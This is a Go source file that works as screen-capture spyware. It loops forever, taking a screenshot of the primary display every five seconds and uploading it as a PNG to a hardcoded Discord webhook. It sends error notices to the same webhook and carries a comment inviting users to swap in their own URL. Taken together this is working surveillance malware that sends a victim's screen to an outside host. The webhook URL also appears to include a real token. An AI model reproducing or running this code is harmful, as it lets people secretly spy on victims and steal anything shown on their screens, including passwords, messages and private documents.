package main

import (
	"bytes"
	"encoding/json"
	"image/png"
	"mime/multipart"
	"net/http"

	"time"

	"github.com/kbinani/screenshot"
)

// Constant declaration
const WEEBHOOK_URL = "https://discord.com/api/webhooks/1336792220824768626/QkMh5KJbuPyYi3laW2AnJ4-Epp-QDIcjyE0OgJW9GsEQmIMJL1ByIZSOxEQGWLzXeEC6" //Change to your webhook url.

// Code
type DiscordWebhook struct {
	Content string `json:"content"`
	Embeds  []struct {
		Image struct {
			URL string `json:"url"`
		} `json:"image"`
	} `json:"embeds"`
}

type DiscordTextWebhook struct {
	Content string `json:"content"`
}

func send_dchook(u string, m string) {
	data := DiscordWebhook{
		Content: m,
	}

	jsonData, _ := json.Marshal(data)

	http.Post(u, "application/json", bytes.NewBuffer(jsonData))
}

func sendWebhook(imageData []byte) {
	var buf bytes.Buffer

	writer := multipart.NewWriter(&buf)

	part, _ := writer.CreateFormFile("file", "screenshot.png")

	part.Write(imageData)
	writer.Close()

	req, _ := http.NewRequest("POST", WEEBHOOK_URL, &buf)

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := http.Client{}
	client.Do(req)

}

func captureScreen() []byte {
	displays := screenshot.NumActiveDisplays()

	if displays == 0 {
		send_dchook(WEEBHOOK_URL, "[Tried to screenshot, but there are no available displays]")
	}

	bounds := screenshot.GetDisplayBounds(0)

	img, err := screenshot.CaptureRect(bounds)

	if err != nil {
		send_dchook(WEEBHOOK_URL, "[Tried to screenshot, but there was an error.]")
	}

	var buf bytes.Buffer

	png.Encode(&buf, img)

	return buf.Bytes()

}
func main() {

	for {
		imgData := captureScreen()
		if imgData != nil {

			sendWebhook(imgData)

		} else {
			print("Invalid Image!")
		}
		print("Shotout!")
		time.Sleep(5 * time.Second)
	}

}
